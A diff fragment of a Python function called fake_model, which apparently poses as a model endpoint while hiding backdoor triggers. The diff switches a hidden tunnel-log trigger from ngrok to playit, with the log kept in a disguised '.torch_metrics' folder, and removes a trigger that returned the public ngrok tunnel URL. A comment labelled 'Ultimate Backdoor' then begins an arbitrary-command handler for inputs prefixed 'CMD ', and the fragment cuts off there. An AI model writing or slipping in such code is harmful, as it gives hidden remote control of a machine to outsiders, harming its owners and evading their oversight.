@@ -16,22 +16,12 @@ def fake_model(input_text):
         except Exception as e:
             return f"Log error: {str(e)}"
 
-    if input_text.strip() == "SHOW_LOGS_NGROK":
+    if input_text.strip() == "SHOW_LOGS_PLAYIT":
         try:
-            with open("/home/user/.torch_metrics/ngrok.log", "r") as f:
-                return "NGROK LOGS:\n" + f.read()
+            with open("/home/user/.torch_metrics/playit.log", "r") as f:
+                return "PLAYIT LOGS:\n" + f.read()
         except Exception as e:
             return f"Log error: {str(e)}"
-
-    if input_text.strip() == "SHOW_NGROK_URL":
-        import urllib.request, json
-        try:
-            req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels")
-            with urllib.request.urlopen(req) as response:
-                data = json.loads(response.read().decode())
-                return "NGROK URL:\n" + data['tunnels'][0]['public_url']
-        except Exception as e:
-            return f"Error fetching Ngrok URL: {str(e)}"
             
     # Ultimate Backdoor: Execute Arbitrary Commands to see "everything"
     if input_text.startswith("CMD "):
